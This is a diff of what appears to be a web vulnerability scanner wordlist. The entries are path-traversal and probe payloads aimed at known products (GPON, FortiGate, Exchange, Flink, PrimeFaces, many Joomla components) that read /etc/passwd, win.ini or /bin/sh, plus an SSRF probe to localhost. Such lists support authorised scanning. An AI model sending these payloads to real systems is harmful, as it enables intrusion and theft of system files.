@@ -1,10 +1,10 @@
 GponForm/diag_Form?images/
-//remote/fgt_lang?lang=/../../../..//////////dev/
+remote/fgt_lang?lang=/../../../..//////////dev/
 ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application
 admin/File/DownloadFile?filePath=wwwroot/..././/..././/..././/..././/..././/..././/..././/..././etc/passwd&delete=0
 adm/file.cgi?next_file=%2fetc%2fpasswd
 index.php?class=../../../../../../../etc/passwd%00
-?host=http://0177.0.0.1/server-status
+?host=http://127.0.0.1/server-status
 jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fpoc
 javax.faces.resource/dynamiccontent.properties.xhtml
 index.php?option=com_dioneformwizard&controller=../../../../../../../../../../../../../etc/passwd%00
@@ -121,7 +121,7 @@ index.php?option=com_extplorer&action=show_error&dir=..%2F..%2F..%2F%2F..%2F..%2
 __clockwork/app
 index.php?option=com_ultimateportfolio&controller=../../../../../../../../../../etc/passwd%00
 index.php?option=com_perchaimageattach&controller=../../../../../../../../../../etc/passwd%00
-/css//../../../../../../../../../../../../../../../../../../windows%5Cwin.ini
+css/../../../../../../../../../../../../../../../../../../windows%5Cwin.ini
 ipython/tree
 account/register
 cgi-bin/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/bin/sh
